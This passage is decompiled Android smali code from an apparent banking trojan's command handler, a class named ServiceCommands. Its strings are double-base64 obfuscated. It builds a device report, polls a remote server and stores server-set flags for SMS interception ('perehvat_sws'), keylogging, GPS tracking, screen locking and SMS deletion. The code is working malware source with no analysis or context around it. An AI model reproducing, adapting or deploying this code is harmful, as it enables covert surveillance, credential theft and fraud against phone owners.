    invoke-static/range {v17 .. v17}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    invoke-static/range {v17 .. v17}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v15, v0, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    :try_start_2da
    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    move-object/from16 v17, v6

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v19, "TWc9PQ=="

    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v20, v5

    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object/from16 v19, v2

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v22, v10

    invoke-static/range {v21 .. v21}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    move-object/from16 v21, v11

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v23

    move-object/from16 v24, v9

    invoke-static/range {v23 .. v23}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->byte:Ljava/lang/String;

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->try:Ljava/lang/String;

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->catch:I

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->class:I

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->final:I

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->case:Ljava/lang/String;

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->const:I

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->this:Ljava/lang/String;

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v14}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v10, v9}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v6, v5, v2}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v5, "dGltZW91dA=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3e3

    return-void

    :cond_3e3
    const-string v5, "WTI5dWJsSmxablZ6WldRPQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5
    :try_end_3f1
    .catch Ljava/lang/Exception; {:try_start_2da .. :try_end_3f1} :catch_1357

    if-eqz v5, :cond_40d

    :try_start_3f3
    iget-object v1, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v3, "YVhOWGIzSnJhVzVu"

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_40c
    .catch Ljava/lang/Exception; {:try_start_3f3 .. :try_end_40c} :catch_40c

    :catch_40c
    return-void

    :cond_40d
    :try_start_40d
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;
    :try_end_415
    .catch Ljava/lang/Exception; {:try_start_40d .. :try_end_415} :catch_1357

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    if-nez v2, :cond_41a

    return-void

    :cond_41a
    const-string v5, "ZkU1UGZBPT0="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_520

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->int:Lnaqsl/ebxcb/exu/for;

    invoke-virtual {v2, v0}, Lnaqsl/ebxcb/exu/for;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->char:Ljava/lang/String;

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v6, "YVdOdmJrTks="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v5, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->goto:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->long:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v12, v24

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v12, v21

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->char:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v12, v22

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {v12}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v12, "pikacappx"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->else:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v2}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v5, v6, v7, v2}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lnaqsl/ebxcb/exu/int;->ifdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    :catch_51c
    move-object/from16 v7, v19

    goto/16 :goto_7a3

    :cond_520
    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    const-string v5, "YzNSaGRHVXhiR1YwYzJkdmRIaDA="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_628

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v6, "TXc9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v9, v4}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v5, v6, v7}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    :try_start_567
    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    aget-object v5, v2, v3

    aget-object v6, v2, v3
    :try_end_578
    .catch Ljava/lang/Exception; {:try_start_567 .. :try_end_578} :catch_51c

    move-object/from16 v7, v19

    :try_start_57a
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_589

    aget-object v6, v2, v3

    const/4 v3, 0x0

    invoke-virtual {v6, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_598

    :cond_589
    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "Ykc5amExOXBibW89"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v0, v6, v7}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_598
    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "YzJGMlpWOXBibW89"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v0, v6, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "WkdWc1gzTjNjdz09"

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x1

    aget-object v9, v2, v6

    invoke-virtual {v3, v0, v5, v9}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "Y0dWeVpXaDJZWFJmYzNkeg=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x2

    aget-object v6, v2, v6

    invoke-virtual {v3, v0, v5, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "Ym1WMGQyOXlhdz09"

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x3

    aget-object v6, v2, v6

    invoke-virtual {v3, v0, v5, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "WjNCeg=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x4

    aget-object v6, v2, v6

    invoke-virtual {v3, v0, v5, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "Wm05eVpXZHliM1Z1Wkhkb2FXeGw="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x5

    aget-object v6, v2, v6

    invoke-virtual {v3, v0, v5, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "YTJWNWJHOW5aMlZ5"

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x6

    aget-object v6, v2, v6

    invoke-virtual {v3, v0, v5, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

